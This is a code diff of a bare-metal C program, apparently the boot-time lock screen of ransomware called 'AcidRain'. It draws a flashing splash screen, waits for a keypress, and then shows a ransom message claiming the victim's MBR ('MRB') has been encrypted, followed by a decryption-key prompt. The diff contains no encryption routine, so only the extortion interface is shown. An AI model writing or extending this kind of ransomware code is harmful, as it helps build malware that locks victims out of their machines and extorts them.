@@ -32,13 +32,26 @@ enum color
 #define VGA_WIDTH 80
 #define VGA_HEIGHT 25
 
+#define KBD_DATA_PORT 0x60 // Keyboard data port
+#define KBD_STATUS_PORT 0x64 // Keyboard status port
+
+#define VGA_IO_PORT    0x3D4  // VGA register port
+#define VGA_IO_DATA    0x3D5  // VGA data port
+
 
 const char* videoMemoryPtr = (char*)0xb8000;
 
 
 void ClearScreen(enum color color);
 void Print(const char* string, int x, int y, enum color color);
+void Sleep(uint32_t cycles);
+uint8_t inb(uint16_t port);
+void outb(uint16_t port, uint8_t data);
+void SetCursorPos(int x, int y);
+
+
 void Stage1(int col);
+void Stage2();
 
 
 
@@ -46,8 +59,35 @@ void _start()
 {
 	ClearScreen(VGA_COLOR_BLACK);
 	
-	Stage1(2);
+	Sleep(150000000);
+
+	while (inb(KBD_STATUS_PORT) & 0x01) //Reading discards from the buffer. We read until it's empty
+	{
+		inb(KBD_DATA_PORT);
+	}
+
+
+	while(1)
+	{
+
+
+
+		Stage1(1);
+		Sleep(80000000);
+		Stage1(2);
+		Sleep(80000000);
+
+
+		if (inb(KBD_STATUS_PORT) & 0x01) // if bit 0 is set, data is available 
+		{
+			//uint8_t scancode = inb(KBD_DATA_PORT);
+			break;
+		
+		}
+	}
 	
+
+	Stage2();
 
 
 	while (1)
@@ -56,13 +96,27 @@ void _start()
 	}
 }
 
+// Simple I/O port read function
+uint8_t inb(uint16_t port) 
+{
+	uint8_t data;
+	__asm__ volatile("inb %1, %0" : "=a"(data) : "Nd"(port));
+	return data;
+}
+
+// Simple I/O port write function
+void outb(uint16_t port, uint8_t data) 
+{
+	__asm__ volatile("outb %0, %1" : : "a"(data), "Nd"(port));
+}
+
 
 
 void Print(const char* string, int x, int y, enum color color)
 {
 	char* addr = videoMemoryPtr + 2 * (80 * y + x);
 
-	for (unsigned int i = 0; string[i] != '\0'; i++)
+	for (int i = 0; string[i] != '\0'; i++)
 	{
 		*addr = string[i];
 		addr++;
@@ -79,10 +133,33 @@ void ClearScreen(enum color color)
 	{
 		*addr = ' ';
 		addr++;
-		*addr = color;
+		*addr = (char)color;
 		addr++;
 	}
 }
+
+
+void Sleep(uint32_t cycles) 
+{
+	while (cycles--) 
+	{
+		__asm__ volatile ("nop");
+	}
+}
+
+void SetCursorPos(int x, int y)
+{
+
+	int position = y * 80 + x;
+
+
+	outb(VGA_IO_PORT, 0x0E);  // Select the high byte register (0x0E)
+	outb(VGA_IO_DATA, (uint8_t)(position >> 8)); // Write the high byte of position
+
+	outb(VGA_IO_PORT, 0x0F);  // Select the low byte register (0x0F)
+	outb(VGA_IO_DATA, (uint8_t)(position & 0xFF)); // Write the low byte of position
+}
+
 
 
 void Stage1(int col)
@@ -112,37 +189,79 @@ void Stage1(int col)
 	};
 
 
+	int position = 24 * 80 + 5;
+
+
 
 	if (col == 1) //black bg
 	{
 
-		//ClearScreen(VGA_COLOR_BLACK);
+		ClearScreen(VGA_COLOR_BROWN | VGA_COLOR_BLACK << 4);
 
-
-		Print("AcidRain 2025", 33, 0, VGA_COLOR_LIGHT_BROWN);
+		Print("AcidRain 2025", 33, 0, VGA_COLOR_BROWN | VGA_COLOR_BLACK << 4);
 
 		int j = 2;
 		for (int i = 0; i < 20; i++)
 		{
-			Print(art[i], 13, j, VGA_COLOR_LIGHT_BROWN);
+			Print(art[i], 13, j, VGA_COLOR_BROWN | VGA_COLOR_BLACK << 4);
 			j++;
 		}
 
-		Print("Press any key...", 31, 23, VGA_COLOR_LIGHT_BROWN);
+		Print("Press any key...", 31, 23, VGA_COLOR_BROWN | VGA_COLOR_BLACK << 4);
+
+
+
+		SetCursorPos(0, 25);
+
 	}
-	else if(col == 2) //yellow bg
+	else if(col == 2) //brown bg
 	{
-		ClearScreen(VGA_COLOR_LIGHT_BROWN);
-		Print("AcidRain 2025", 33, 0, VGA_COLOR_BLACK);
+		
+		ClearScreen(VGA_COLOR_BLACK | VGA_COLOR_BROWN << 4);
+
+
+		Print("AcidRain 2025", 33, 0, VGA_COLOR_BLACK | VGA_COLOR_BROWN << 4);
 
 		int j = 2;
 		for (int i = 0; i < 20; i++)
 		{
-			Print(art[i], 13, j, VGA_COLOR_BLACK);
+			Print(art[i], 13, j, VGA_COLOR_BLACK | VGA_COLOR_BROWN << 4);
 			j++;
 		}
 
-		Print("Press any key...", 31, 23, VGA_COLOR_BLACK);
+		Print("Press any key...", 31, 23, VGA_COLOR_BLACK | VGA_COLOR_BROWN << 4);
+
+		SetCursorPos(0, 25);
+
 	}
+
+}
+
+
+void Stage2()
+{
+	ClearScreen(VGA_COLOR_BROWN | VGA_COLOR_BLACK << 4);
+
+	char* addr = videoMemoryPtr + 2 * (80 * 1 + 0);
+
+
+	Print("Your computer has been taken over by AcidRain ransomware!", 0, 0, VGA_COLOR_BROWN);
+	
+	for (int i = 0; i < VGA_WIDTH; i++)
+	{
+		*addr = ' ';
+		addr++;
+		*addr = VGA_COLOR_LIGHT_GREY | VGA_COLOR_LIGHT_GREY << 4;
+		addr++;
+	}
+
+
+	Print("Your MRB has been encrypted. In order to restore it, follow the steps below!", 0, 2, VGA_COLOR_BROWN);
+	Print("1. Enter your decryption key below", 0, 4, VGA_COLOR_BROWN);
+
+	Print("Key:", 0, 24, VGA_COLOR_BROWN);
+
+	SetCursorPos(5, 24);
+
 
 }
